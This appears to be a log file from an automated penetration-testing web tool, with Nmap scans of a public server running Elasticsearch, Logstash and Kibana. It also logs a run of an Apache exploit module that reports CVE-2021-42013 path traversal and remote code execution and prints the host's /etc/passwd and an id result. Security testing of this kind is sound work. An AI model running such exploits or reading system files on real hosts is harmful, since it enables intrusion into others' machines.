+SF:\r\ncontent-length:\x2060\r\nDate:\x20Sun,\x2007\x20Jul\x202024\x2013:3
+SF:8:41\x20GMT\r\nConnection:\x20close\r\n\r\n{\"statusCode\":404,\"error\
+SF:":\"Not\x20Found\",\"message\":\"Not\x20Found\"}");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9200-TCP:V=7.94%T=SSL%I=7%D=7/7%Time=668A9A5F%P=i686-pc-windows-win
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:cate:\x20Basic\x20realm=\"security\"\x20charset=\"UTF-8\"\r\nWWW-Authen
+SF:ticate:\x20Bearer\x20realm=\"security\"\r\nWWW-Authenticate:\x20ApiKey\
+SF:r\ncontent-type:\x20application/json\r\ncontent-length:\x20459\r\n\r\n{
+SF:\"error\":{\"root_cause\":\[{\"type\":\"security_exception\",\"reason\"
+SF::\"missing\x20authentication\x20credentials\x20for\x20REST\x20request\x
+SF:20\[/\]\",\"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"secur
+SF:ity\\\"\x20charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\"
+SF:,\"ApiKey\"\]}}\],\"type\":\"security_exception\",\"reason\":\"missing\
+SF:x20authentication\x20credentials\x20for\x20REST\x20request\x20\[/\]\",\
+SF:"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"security\\\"\x20
+SF:charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\",\"ApiKey\"
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:w:\x20GET,DELETE,HEAD\r\nX-elastic-product:\x20Elasticsearch\r\ncontent
+SF:-type:\x20text/plain;\x20charset=UTF-8\r\ncontent-length:\x200\r\n\r\n"
+SF:)%r(RTSPRequest,150,"RTSP/1\.0\x20400\x20Bad\x20Request\r\nX-elastic-pr
+SF:oduct:\x20Elasticsearch\r\ncontent-type:\x20application/json\r\ncontent
+SF:-length:\x20221\r\n\r\n{\"error\":{\"root_cause\":\[{\"type\":\"illegal
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:rsion:\x20RTSP/1\.0\"}\],\"type\":\"illegal_argument_exception\",\"reas
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:r\nWWW-Authenticate:\x20Basic\x20realm=\"security\"\x20charset=\"UTF-8\
+SF:"\r\nWWW-Authenticate:\x20Bearer\x20realm=\"security\"\r\nWWW-Authentic
+SF:ate:\x20ApiKey\r\ncontent-type:\x20application/json\r\ncontent-length:\
+SF:x20529\r\n\r\n{\"error\":{\"root_cause\":\[{\"type\":\"security_excepti
+SF:on\",\"reason\":\"missing\x20authentication\x20credentials\x20for\x20RE
+SF:ST\x20request\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\",\"header\"
+SF::{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"security\\\"\x20charset=\
+SF:\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\",\"ApiKey\"\]}}\],\"
+SF:type\":\"security_exception\",\"reason\":\"missing\x20authentication\x2
+SF:0credentials\x20for\x20REST\x20request\x20\[/nice%20ports%2C/Tri%6Eity\
+SF:.txt%2ebak\]\",\"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"
+SF:security\\\"\x20charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\
+SF:\\"\",\"ApiKey\"\]}},\"status\":401}");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9600-TCP:V=7.94%I=7%D=7/7%Time=668A9A4F%P=i686-pc-windows-windows%r
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20open\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/client\.rb:268:in\x20`try_to_finish'\n/usr/share/logstash/vendor/bund
+SF:le/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/server\.rb:298:in\x20`
+SF:reactor_wakeup'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/p
+SF:uma-6\.4\.2-java/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/u
+SF:sr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/li
+SF:b/puma/reactor\.rb:119:in\x20`wakeup!'\n/usr/share/logstash/vendor/bund
+SF:le/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/reactor\.rb:76:in\x20`
+SF:block\x20in\x20select_loop'\norg/nio4r/Selector\.java:218:in\x20`select
+SF:'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-ja
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF::\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nContent-
+SF:Length:\x20400\r\n\r\n{\"host\":\"751247e67e9c\",\"version\":\"8\.13\.4
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:a-b1561d4654a2\",\"name\":\"logstash\",\"ephemeral_id\":\"3a890be7-70bc
+SF:-4622-84b9-4c22678de0ef\",\"status\":\"green\",\"snapshot\":false,\"pip
+SF:eline\":{\"workers\":4,\"batch_size\":125,\"batch_delay\":50},\"build_d
+SF:ate\":\"2024-05-06T13:04:36\+00:00\",\"build_sha\":\"80e67bc73d1dede7d6
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nContent-L
+SF:ength:\x2057\r\n\r\n{\"path\":\"/\",\"status\":404,\"error\":{\"message
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,337,"HTTP/1\.0\x20400\x20Bad\x20R
+SF:equest\r\nContent-Length:\x20746\r\n\r\nPuma\x20caught\x20this\x20error
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:trying\x20to\x20open\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:in\x20`execute'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/p
+SF:uma-6\.4\.2-java/lib/puma/client\.rb:268:in\x20`try_to_finish'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/client\.rb:287:in\x20`eagerly_finish'\n/usr/share/logstash/vendor/bun
+SF:dle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/server\.rb:449:in\x20
+SF:`process_client'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/
+SF:puma-6\.4\.2-java/lib/puma/server\.rb:245:in\x20`block\x20in\x20run'\n/
+SF:usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/l
+SF:ib/puma/thread_pool\.rb:155:in\x20`block\x20in\x20spawn_thread'HTTP/1\.
+SF:1\x20400\x20Bad\x20Request\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 395.72 seconds
+
+2024-07-07 20:42:49,939 INFO Found Apache ports: ['80', '889', '3790']
+2024-07-07 20:42:49,939 INFO Checking vulnerabilities on http://152.42.212.132:80
+2024-07-07 20:42:49,946 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 20:42:50,031 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 20:42:50,038 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 20:42:50,081 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 20:42:50,083 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 20:42:50,087 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 20:42:50,173 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 20:42:50,283 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 20:42:50,352 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 20:43:12,793 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 20:43:12,798 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 20:43:12,881 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 20:43:12,888 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 20:43:12,968 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 20:43:12,971 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 20:43:13,049 INFO Header added successfully.
+2024-07-07 20:43:13,069 INFO Cover page created successfully.
+2024-07-07 20:43:13,289 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 20:43:13,289 INFO Process completed in 640.8468973636627 seconds.
+2024-07-07 20:43:13,294 INFO 127.0.0.1 - - [07/Jul/2024 20:43:13] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 20:43:13,311 INFO 127.0.0.1 - - [07/Jul/2024 20:43:13] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:53:36,388 INFO 127.0.0.1 - - [07/Jul/2024 20:53:36] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 20:59:28,437 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 20:59:28,578 INFO  * Restarting with stat
+2024-07-07 20:59:30,742 WARNING  * Debugger is active!
+2024-07-07 20:59:30,768 INFO  * Debugger PIN: 860-226-893
+2024-07-07 20:59:34,092 INFO 127.0.0.1 - - [07/Jul/2024 20:59:34] "GET / HTTP/1.1" 200 -
+2024-07-07 20:59:34,467 INFO 127.0.0.1 - - [07/Jul/2024 20:59:34] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:59:37,177 INFO 127.0.0.1 - - [07/Jul/2024 20:59:37] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 20:59:37,202 INFO 127.0.0.1 - - [07/Jul/2024 20:59:37] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 20:59:37,230 INFO 127.0.0.1 - - [07/Jul/2024 20:59:37] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 20:59:41,068 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 21:09:58,596 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 21:04 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.038s latency).
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE    SERVICE         VERSION
+22/tcp    open     ssh             OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 82:95:15:88:17:2c:b4:c9:b0:b7:bd:3f:03:ff:6f:c5 (ECDSA)
+|_  256 a9:b8:d6:8e:29:ca:55:fe:4c:9c:f1:ed:23:33:23:47 (ED25519)
+80/tcp    open     http?
+|_http-title: Welcome to nginx!
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.50 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|_  http/1.1
+|     HTTP/1.1 302 Found
+|     location: /login?next=%2F
+|     x-content-type-options: nosniff
+|     referrer-policy: strict-origin-when-cross-origin
+|     permissions-policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     cross-origin-opener-policy: same-origin
+|     content-security-policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 0
+|     Date: Sun, 07 Jul 2024 14:06:49 GMT
+|     Connection: close
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     X-Content-Type-Options: nosniff
+|     Referrer-Policy: strict-origin-when-cross-origin
+|     Permissions-Policy: camera=(), display-capture=(), fullscreen=(self), geolocation=(), microphone=(), web-share=()
+|     Cross-Origin-Opener-Policy: same-origin
+|     Content-Security-Policy: script-src 'report-sample' 'self'; worker-src 'report-sample' 'self' blob:; style-src 'report-sample' 'self' 'unsafe-inline'
+|     kbn-name: kibana.backmie.online
+|     kbn-license-sig: 22b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88c86d5f5fe891
+|     content-type: application/json; charset=utf-8
+|     cache-control: private, no-cache, no-store, must-revalidate
+|     content-length: 60
+|     Date: Sun, 07 Jul 2024 14:06:49 GMT
+|     Connection: close
+|_    {"statusCode":404,"error":"Not Found","message":"Not Found"}
+|     HTTP/1.0 401 Unauthorized
+|     WWW-Authenticate: Basic realm="security" charset="UTF-8"
+|     WWW-Authenticate: Bearer realm="security"
+|     WWW-Authenticate: ApiKey
+|     content-type: application/json
+|     content-length: 529
+|     {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/nice%20ports%2C/Tri%6Eity.txt%2ebak]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/nice%20ports%2C/Tri%6Eity.txt%2ebak]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}},"status":401}
+|   GetRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     WWW-Authenticate: Basic realm="security" charset="UTF-8"
+|     WWW-Authenticate: Bearer realm="security"
+|     WWW-Authenticate: ApiKey
+|     content-type: application/json
+|     content-length: 459
+|     {"error":{"root_cause":[{"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}}],"type":"security_exception","reason":"missing authentication credentials for REST request [/]","header":{"WWW-Authenticate":["Basic realm="security" charset="UTF-8"","Bearer realm="security"","ApiKey"]}},"status":401}
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET,DELETE,HEAD
+|     X-elastic-product: Elasticsearch
+|     content-type: text/plain; charset=UTF-8
+|     content-length: 0
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     X-elastic-product: Elasticsearch
+|     content-type: application/json
+|     content-length: 221
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 989
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/client.rb:268:in `try_to_finish'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:298:in `reactor_wakeup'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/server.rb:248:in `block in run'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/reactor.rb:119:in `wakeup!'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/reactor.rb:76:in `block in select_loop'
+|     org/nio4r/Selector.java:218:in `select'
+|     /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Content-Length: 400
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     X-Cascade: pass
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Content-Length: 57
+|_    {"path":"/","status":404,"error":{"message":"Not Found"}}
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.94%I=7%D=7/7%Time=668AA0ED%P=i686-pc-windows-windows%r(D
+SF:NSVersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5601-TCP:V=7.94%T=SSL%I=7%D=7/7%Time=668AA0F9%P=i686-pc-windows-win
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\?next=%2F\r\nx-content-type-options:\x20nosniff\r\nreferrer-policy:\x2
+SF:0strict-origin-when-cross-origin\r\npermissions-policy:\x20camera=\(\),
+SF:\x20display-capture=\(\),\x20fullscreen=\(self\),\x20geolocation=\(\),\
+SF:x20microphone=\(\),\x20web-share=\(\)\r\ncross-origin-opener-policy:\x2
+SF:0same-origin\r\ncontent-security-policy:\x20script-src\x20'report-sampl
+SF:e'\x20'self';\x20worker-src\x20'report-sample'\x20'self'\x20blob:;\x20s
+SF:tyle-src\x20'report-sample'\x20'self'\x20'unsafe-inline'\r\nkbn-name:\x
+SF:20kibana\.backmie\.online\r\nkbn-license-sig:\x2022b228dc8aa2ad9755bd9d
+SF:66952f383363427f645c33db951e88c86d5f5fe891\r\ncache-control:\x20private
+SF:,\x20no-cache,\x20no-store,\x20must-revalidate\r\ncontent-length:\x200\
+SF:r\nDate:\x20Sun,\x2007\x20Jul\x202024\x2014:06:49\x20GMT\r\nConnection:
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:\r\nX-Content-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20strict-or
+SF:igin-when-cross-origin\r\nPermissions-Policy:\x20camera=\(\),\x20displa
+SF:y-capture=\(\),\x20fullscreen=\(self\),\x20geolocation=\(\),\x20microph
+SF:one=\(\),\x20web-share=\(\)\r\nCross-Origin-Opener-Policy:\x20same-orig
+SF:in\r\nContent-Security-Policy:\x20script-src\x20'report-sample'\x20'sel
+SF:f';\x20worker-src\x20'report-sample'\x20'self'\x20blob:;\x20style-src\x
+SF:20'report-sample'\x20'self'\x20'unsafe-inline'\r\nkbn-name:\x20kibana\.
+SF:backmie\.online\r\nkbn-license-sig:\x2022b228dc8aa2ad9755bd9d66952f3833
+SF:63427f645c33db951e88c86d5f5fe891\r\ncontent-type:\x20application/json;\
+SF:x20charset=utf-8\r\ncache-control:\x20private,\x20no-cache,\x20no-store
+SF:,\x20must-revalidate\r\ncontent-length:\x2060\r\nDate:\x20Sun,\x2007\x2
+SF:0Jul\x202024\x2014:06:49\x20GMT\r\nConnection:\x20close\r\n\r\n{\"statu
+SF:sCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Found\"}")%
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:ptions:\x20nosniff\r\nReferrer-Policy:\x20strict-origin-when-cross-orig
+SF:in\r\nPermissions-Policy:\x20camera=\(\),\x20display-capture=\(\),\x20f
+SF:ullscreen=\(self\),\x20geolocation=\(\),\x20microphone=\(\),\x20web-sha
+SF:re=\(\)\r\nCross-Origin-Opener-Policy:\x20same-origin\r\nContent-Securi
+SF:ty-Policy:\x20script-src\x20'report-sample'\x20'self';\x20worker-src\x2
+SF:0'report-sample'\x20'self'\x20blob:;\x20style-src\x20'report-sample'\x2
+SF:0'self'\x20'unsafe-inline'\r\nkbn-name:\x20kibana\.backmie\.online\r\nk
+SF:bn-license-sig:\x2022b228dc8aa2ad9755bd9d66952f383363427f645c33db951e88
+SF:c86d5f5fe891\r\ncontent-type:\x20application/json;\x20charset=utf-8\r\n
+SF:cache-control:\x20private,\x20no-cache,\x20no-store,\x20must-revalidate
+SF:\r\ncontent-length:\x2060\r\nDate:\x20Sun,\x2007\x20Jul\x202024\x2014:0
+SF:6:49\x20GMT\r\nConnection:\x20close\r\n\r\n{\"statusCode\":404,\"error\
+SF:":\"Not\x20Found\",\"message\":\"Not\x20Found\"}");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9200-TCP:V=7.94%T=SSL%I=7%D=7/7%Time=668AA0F8%P=i686-pc-windows-win
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:cate:\x20Basic\x20realm=\"security\"\x20charset=\"UTF-8\"\r\nWWW-Authen
+SF:ticate:\x20Bearer\x20realm=\"security\"\r\nWWW-Authenticate:\x20ApiKey\
+SF:r\ncontent-type:\x20application/json\r\ncontent-length:\x20459\r\n\r\n{
+SF:\"error\":{\"root_cause\":\[{\"type\":\"security_exception\",\"reason\"
+SF::\"missing\x20authentication\x20credentials\x20for\x20REST\x20request\x
+SF:20\[/\]\",\"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"secur
+SF:ity\\\"\x20charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\"
+SF:,\"ApiKey\"\]}}\],\"type\":\"security_exception\",\"reason\":\"missing\
+SF:x20authentication\x20credentials\x20for\x20REST\x20request\x20\[/\]\",\
+SF:"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"security\\\"\x20
+SF:charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\",\"ApiKey\"
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:w:\x20GET,DELETE,HEAD\r\nX-elastic-product:\x20Elasticsearch\r\ncontent
+SF:-type:\x20text/plain;\x20charset=UTF-8\r\ncontent-length:\x200\r\n\r\n"
+SF:)%r(RTSPRequest,150,"RTSP/1\.0\x20400\x20Bad\x20Request\r\nX-elastic-pr
+SF:oduct:\x20Elasticsearch\r\ncontent-type:\x20application/json\r\ncontent
+SF:-length:\x20221\r\n\r\n{\"error\":{\"root_cause\":\[{\"type\":\"illegal
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:rsion:\x20RTSP/1\.0\"}\],\"type\":\"illegal_argument_exception\",\"reas
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:r\nWWW-Authenticate:\x20Basic\x20realm=\"security\"\x20charset=\"UTF-8\
+SF:"\r\nWWW-Authenticate:\x20Bearer\x20realm=\"security\"\r\nWWW-Authentic
+SF:ate:\x20ApiKey\r\ncontent-type:\x20application/json\r\ncontent-length:\
+SF:x20529\r\n\r\n{\"error\":{\"root_cause\":\[{\"type\":\"security_excepti
+SF:on\",\"reason\":\"missing\x20authentication\x20credentials\x20for\x20RE
+SF:ST\x20request\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\",\"header\"
+SF::{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"security\\\"\x20charset=\
+SF:\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\\\"\",\"ApiKey\"\]}}\],\"
+SF:type\":\"security_exception\",\"reason\":\"missing\x20authentication\x2
+SF:0credentials\x20for\x20REST\x20request\x20\[/nice%20ports%2C/Tri%6Eity\
+SF:.txt%2ebak\]\",\"header\":{\"WWW-Authenticate\":\[\"Basic\x20realm=\\\"
+SF:security\\\"\x20charset=\\\"UTF-8\\\"\",\"Bearer\x20realm=\\\"security\
+SF:\\"\",\"ApiKey\"\]}},\"status\":401}");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9600-TCP:V=7.94%I=7%D=7/7%Time=668AA0E8%P=i686-pc-windows-windows%r
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20open\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/client\.rb:268:in\x20`try_to_finish'\n/usr/share/logstash/vendor/bund
+SF:le/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/server\.rb:298:in\x20`
+SF:reactor_wakeup'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/p
+SF:uma-6\.4\.2-java/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/u
+SF:sr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/li
+SF:b/puma/reactor\.rb:119:in\x20`wakeup!'\n/usr/share/logstash/vendor/bund
+SF:le/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/reactor\.rb:76:in\x20`
+SF:block\x20in\x20select_loop'\norg/nio4r/Selector\.java:218:in\x20`select
+SF:'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-ja
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF::\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nContent-
+SF:Length:\x20400\r\n\r\n{\"host\":\"751247e67e9c\",\"version\":\"8\.13\.4
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:a-b1561d4654a2\",\"name\":\"logstash\",\"ephemeral_id\":\"3a890be7-70bc
+SF:-4622-84b9-4c22678de0ef\",\"status\":\"green\",\"snapshot\":false,\"pip
+SF:eline\":{\"workers\":4,\"batch_size\":125,\"batch_delay\":50},\"build_d
+SF:ate\":\"2024-05-06T13:04:36\+00:00\",\"build_sha\":\"80e67bc73d1dede7d6
